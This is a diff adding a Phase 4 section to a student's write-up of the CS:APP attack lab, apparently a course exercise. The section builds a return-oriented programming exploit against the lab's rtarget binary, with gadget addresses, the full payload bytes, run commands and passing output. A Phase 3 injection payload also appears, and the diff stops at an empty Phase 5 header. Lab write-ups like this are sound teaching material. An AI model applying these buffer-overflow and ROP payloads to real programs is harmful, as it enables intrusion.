@@ -9,7 +9,7 @@ Note: I took the lab statement from the `yyqian/csapp-labs` github repository be
 The first thing i need to do is to get the disassembled version of `ctarget`.
 
 ```bash
-attack-lab / % objdump -D ctarget > ctarget_dump.txt
+attack-lab / % objdump -D ctarget > ctarget_dump.d
 ```
 
 Have a look at the dump of `getbuf` function:
@@ -169,3 +169,54 @@ PASS: Would have posted the following:
         lab     attacklab
         result  1:PASS:0xffffffff:ctarget:3:48 83 EC 18 BF 00 DD 61 55 90 90 90 90 90 90 90 90 90 90 90 90 90 90 C3 FA 18 40 00 00 00 00 00 3F 3F 3F 3F 3F 3F 3F 3F 78 DC 61 55 00 00 00 00 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 35 39 62 39 39 37 66 61
 ```
+
+## PHASE 4
+
+First thing we need to do there is to get the disassembled version of `rtarget`.
+
+```bash
+attack-lab / % objdump -D rtarget > rtarget_dump.d
+```
+
+My task is to repeat the phase 2, but when the ASLR and NX/DEC is on using the return-oriented programming. Everything we need in this phase is located between the `start_farm` and `mid_farm` functions and 2 gadgets are enough (according to the `attacklab.pdf`).
+
+We need to execute the code like
+```assembly
+movl $0x59b997fa, %edi
+```
+and then return to `touch2` function.
+
+There's no exact `bf fa 97 b9 59 c3` opcode sequence in the dump, but we can write the value to register `%eax` and copy it to `%edi`, there is such opcode sequence (`48 89 c7 90 c3`) in the `setval_426` function.
+
+Also we need to write our cookie on the stack and pop it into a register (I HAVE NOT FIND THIS OUT BY MYSELF, LLM HELPED ME IM SO FUCKING STUPID PIECE OF SHIT, I thought that I need to assemble the cookie using the integer overflow and mathematical operations XD).
+
+In function `addval_219` we see, the `58 90 c3` sequence. That sequence pops the current top stack value in `%rax` register. So, our algorithm will be something like:
+```assembly
+popq %rax       ; pop the top stack value (here is the cookie)
+movl %eax, %edi ; copy to edi
+```
+
+The address of `58 90 c3` sequence is `4019ab` and the address of `48 89 c7 90 c3` sequence is `4019c5`. So, we need to write these addresses on the stack as return addresses. Writing this in a code with the correct endianess is not a very complicated task:
+```
+3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
+```
+
+```bash
+attack-lab / % ./hex2raw < solutions/phase4/phase4_bytes.txt > solutions/phase4/phase4_raw.txt
+attack-lab / % ./rtarget -q -i solutions/phase4/phase4_raw.txt
+```
+
+And of course, it worked on the first attempt.
+```
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:2:3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
+```
+
+## PHASE 5
+
